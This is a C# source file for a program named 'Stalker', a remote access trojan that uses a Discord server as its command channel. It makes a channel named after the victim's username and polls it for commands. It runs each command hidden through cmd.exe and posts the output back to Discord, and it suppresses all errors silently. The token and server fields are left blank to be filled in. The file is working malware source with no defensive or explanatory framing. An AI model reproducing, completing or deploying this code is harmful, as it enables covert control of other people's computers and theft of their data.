using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Text.Json;
using System.Text;
using System.Threading;
using System.Threading.Tasks;




class Stalker
{
    private bool running;
    private string discordToken;
    private string discordServerUrl;
    private string shellUrl;
    private int shellDelaySec;
    private string username;
    private string programName;
    private HttpClient httpClient;

    public Stalker()
    {
        running = true;

        // Discord token
        discordToken = "";
        // Discord Server link
        discordServerUrl = "";

        shellUrl = "";
        shellDelaySec = 10;

        username = Environment.UserName;
        programName = Path.GetFileName(System.Reflection.Assembly.GetExecutingAssembly().Location);
        httpClient = new HttpClient();
        httpClient.DefaultRequestHeaders.Add("Authorization", discordToken);
    }

    public async Task ShellAsync()
    {
        while (running)
        {
            try
            {
                await Task.Delay(shellDelaySec * 1000);
                var response = await httpClient.GetAsync(shellUrl + "?limit=1");
                var responseString = await response.Content.ReadAsStringAsync();
                var jsonArray = JsonDocument.Parse(responseString).RootElement;
                var command = jsonArray[0].GetProperty("content").GetString();

                if (command == "quit")
                {
                    running = false;
                    await SendTextAsync("<shell>bye my friend, hopefully i see u soon :)", shellUrl);
                }
                else if (command.StartsWith("<shell>"))
                {
                    // Handle shell-specific commands
                }
                else if (command.StartsWith("cd"))
                {
                    Directory.SetCurrentDirectory(command.Substring(3));
                    await SendTextAsync("<shell>" + command, shellUrl);
                }
                else if (command.Length > 0)
                {
                    var proc = new Process
                    {
                        StartInfo = new ProcessStartInfo
                        {
                            FileName = "cmd.exe",
                            Arguments = "/c " + command,
                            RedirectStandardOutput = true,
                            RedirectStandardError = true,
                            UseShellExecute = false,
                            CreateNoWindow = true
                        }
                    };
                    proc.Start();
                    var stdoutValue = await proc.StandardOutput.ReadToEndAsync() + await proc.StandardError.ReadToEndAsync();
                    if (stdoutValue.Length > 1900)
                    {
                        stdoutValue = stdoutValue.Substring(0, 1900);
                    }
                    await SendTextAsync("<shell>" + stdoutValue, shellUrl);
                }
            }
            catch
            {
                // Handle errors silently
            }
        }
    }

    public async Task SendTextAsync(string text, string url)
    {
        var data = new StringContent(JsonSerializer.Serialize(new { content = text }), Encoding.UTF8, "application/json");
        await httpClient.PostAsync(url, data);
    }

    public async Task MakeChannelAsync(string name)
    {
        var payload = new
        {
            name = name,
            type = 0
        };
        var data = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");
        await httpClient.PostAsync(discordServerUrl, data);
    }

    public string MakeUrl(string number)
    {
        return $"https://discord.com/api/v9/channels/{number}/messages";
    }

    public async Task GiveChannelToVarAsync()
    {
        var response = await httpClient.GetStringAsync(discordServerUrl);
        var jsonArray = JsonDocument.Parse(response).RootElement;

        foreach (var pp in jsonArray.EnumerateArray())
        {
            if (pp.GetProperty("type").GetInt32() == 0)
            {
                var n = pp.GetProperty("name").GetString();
                if (n == $"{username}-shell")
                {
                    shellUrl = MakeUrl(pp.GetProperty("id").GetString());
                }
            }
        }
    }

    public async Task FindChannelUrlAsync()
    {
        var response = await httpClient.GetStringAsync(discordServerUrl);
        var content = response;

        if (!content.Contains($"{username}-shell"))
        {
            await MakeChannelAsync($"{username}-shell");
        }

        await GiveChannelToVarAsync();
    }

    public async Task StartAsync()
    {
        await FindChannelUrlAsync();
        await ShellAsync();
    }
}

class Program
{
    static async Task Main(string[] args)
    {
        await new Stalker().StartAsync();
    }
}
